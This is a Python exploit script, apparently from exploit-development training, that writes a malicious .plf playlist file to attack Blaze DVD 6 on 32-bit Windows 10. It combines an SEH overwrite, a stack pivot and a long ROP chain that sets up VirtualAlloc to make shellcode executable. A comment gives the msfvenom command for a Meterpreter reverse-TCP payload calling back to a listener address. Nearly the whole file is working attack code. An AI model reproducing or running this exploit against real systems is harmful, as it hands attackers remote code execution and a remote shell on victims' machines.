# Blaze DVD Version 6
# Tested Windows 10 32 bit
from struct import pack


def main():

    filename = "C:\\Users\\XXXX\\Desktop\\ExpDev_Traning\\blazedummyfile\\blaze-exp.plf"

   
    ConfigurationBaseDll = 0x60300000


    nops = b"\x90" * 0x10

    # Bad Chars -> \x0a\x1a\x2f\x3a\x5c
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.132.12 LPORT=443 -b "\x00\x0a\x1a\x2f\x3a\x5c" -f py -v shellcode --smallest
    shellcode =  b"\x90\x90\x81\xC4\x3C\xF6\xFF\xFF" # add esp,-2500 // give some space to avoid metastploit shellcode decoder to corrupt itelf."
    shellcode += b"SHELLCODE HERE"

    shellcode += b"D" * (600 - len(shellcode)) 


    # VA Template
    va = pack("<L",(0x48484848))    # VirtualAlloc
    va += pack("<L",(0x49494949))   # return address -> Shellcode Address
    va += pack("<L",(0x50505050))   # lpAddress -> Shellcode Address
    va += pack("<L",(0x51515151))   # dwSize -> 0x1
    va += pack("<L",(0x52525252))   # flAllocationType -> 0x1000
    va += pack("<L", (0x53535353))  # flProtect -> 0x40

    paddingva = b"A"*0x10

    buf = nops + shellcode + b"A" * (868  - len(va) - len(paddingva) - len(shellcode) - len(nops))  + va + paddingva
    buf += pack("<L",0x42424242) # dummy value  # Next SEH
    buf += pack("<L",ConfigurationBaseDll+0xf1b3) # 0x6030f1b3: add esp, 0x00000948 ; ret ; (1 found) # Handler SEH PowerManagementCtrl.dll


    padding = b"\x90" * 0x40  # 0x6c // 0x54 / 0x74 / 0x78 // 0x44 // 0x58 // 0x60

    # ROP CHAIN
    # Patching VirtualAlloc
    rop = pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0x88d31bd0)) # IAT VirtualAlloc -> ? 0x88888888 + 004a9248 // note that original was 1a i changed 1b because 1a is bad character
    rop += pack("<L",(ConfigurationBaseDll+0x2865a)) ###  0x6032865a: pop eax ; ret ; (1 found)
    rop += pack("<L", (0x88888988)) # 0x88888988  for calculation ; note the 9 to avoid the 1a bad character
    rop += pack("<L",(ConfigurationBaseDll+0x8466)) # 0x60308466: sub ecx, eax ; sub edx, eax ; xor eax, eax ; cmp ecx, edx ; setnle al ; retn 0x0004 ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x39cda)) # 0x60339cda: mov eax, ecx ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # junk for retn 0x4
    rop += pack("<L",(ConfigurationBaseDll+0x2b9fa)) # 0x6032b9fa: mov ecx,  [eax] ; mov eax,  [ecx-0x08] ; mov edx,  [ecx-0x04] ; ret ; 
    rop += pack("<L",(ConfigurationBaseDll+0x3b77b)) #  0x6033b77b: pop edx ; xor al, 0x60 ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x63854)) # Writable address 0x60363854 for the edx below -> 0x603359cb
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xffffff64)) # junk for retn esi  # offset for eax (stack) -0x9c
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi

    # Patching Return Address -> Shellcode
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xffffff44)) # junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0xffffffff)) # -0x1
    rop += pack("<L",(ConfigurationBaseDll+0x3bec2)) # 0x6033bec2: inc ecx ; add al, 0x03 ; ret
    rop += pack("<L",(ConfigurationBaseDll+0x2cbd0)) # 0x6032cbd0: mov edx, eax ; xor eax, eax ; and cl, 0x1F ; shl edx, cl ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0xfffffbfd)) # -0x423 offset for shellcode addr - 0x403
    rop += pack("<L",(ConfigurationBaseDll+0x27438)) #  0x60327438: add ecx, edx ; add eax, ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn esi 
    rop += pack("<L",(ConfigurationBaseDll+0x3b77b)) #  0x6033b77b: pop edx ; xor al, 0x60 ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x63854)) # Writable address 0x60363854 for the edx below -> 0x603359cb
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xffffff04)) # -0xfc junk for retn esi  # offset for eax (stack) -0xfc
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
   
    # Patching lpAddress -> Shellcode Address
    rop += pack("<L",(ConfigurationBaseDll+0x250cb)) # 0x603250cb: inc eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x250cb)) # 0x603250cb: inc eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x250cb)) # 0x603250cb: inc eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x250cb)) # 0x603250cb: inc eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi

    # Patching dwSize -> 0x1
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0xffffffff)) # -0x1
    rop += pack("<L",(ConfigurationBaseDll+0x3bec2)) # 0x6033bec2: inc ecx ; add al, 0x03 ; ret
    rop += pack("<L",(ConfigurationBaseDll+0x3bec2)) # 0x6033bec2: inc ecx ; add al, 0x03 ; ret
    rop += pack("<L",(ConfigurationBaseDll+0x23170)) # 0x60323170: dec eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x23170)) # 0x60323170: dec eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi


    # Patching flAllocationType -> 0x1000
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0x88889888)) # 0x1000 -> ? 0x88888888 + 0x1000 // 
    rop += pack("<L",(ConfigurationBaseDll+0x2865a)) ###  0x6032865a: pop eax ; ret ; (1 found)
    rop += pack("<L", (0x88888888)) # 0x88888888  for calculation ; 
    rop += pack("<L",(ConfigurationBaseDll+0x8466)) # 0x60308466: sub ecx, eax ; sub edx, eax ; xor eax, eax ; cmp ecx, edx ; setnle al ; retn 0x0004 ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x3b77b)) #  0x6033b77b: pop edx ; xor al, 0x60 ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # junk for retn 0x4
    rop += pack("<L",(ConfigurationBaseDll+0x63854)) # Writable address 0x60363854 for the edx below -> 0x603359cb
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xfffffe90)) # -0x170 junk for retn esi  # offset for eax (stack) -0xbc
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi

    # flProtect -> 0x40
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0x888888c8)) # 0x40 -> ? 0x88888888 + 0x40 // 
    rop += pack("<L",(ConfigurationBaseDll+0x2865a)) ###  0x6032865a: pop eax ; ret ; (1 found)
    rop += pack("<L", (0x88888888)) # 0x88888888  for calculation ; 
    rop += pack("<L",(ConfigurationBaseDll+0x8466)) # 0x60308466: sub ecx, eax ; sub edx, eax ; xor eax, eax ; cmp ecx, edx ; setnle al ; retn 0x0004 ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x3b77b)) #  0x6033b77b: pop edx ; xor al, 0x60 ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # junk for retn 0x4
    rop += pack("<L",(ConfigurationBaseDll+0x63854)) # Writable address 0x60363854 for the edx below -> 0x603359cb
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xfffffe4c)) # -0x1b4 junk for retn esi  # offset for eax (stack) -0x1b4
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    

    # Align ESP
    rop += pack("<L", (ConfigurationBaseDll+0x1dd4)) # 0x60301dd4: pop esi ; ret ; (1 found) 
    rop += pack("<L",(0xffffffec)) # -0x14 junk for retn esi  # offset for eax (stack) -0xbc
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L", (ConfigurationBaseDll+0x33c42)) # 0x60333c42: xchg eax, esp ; ret ; (1 found)


    buf += padding + rop + b"E" * (0x13e8 - len(buf) - len(padding) - len(rop) )

    with open(filename,'wb') as f:
        f.write(buf)


if __name__ == '__main__':
    main()
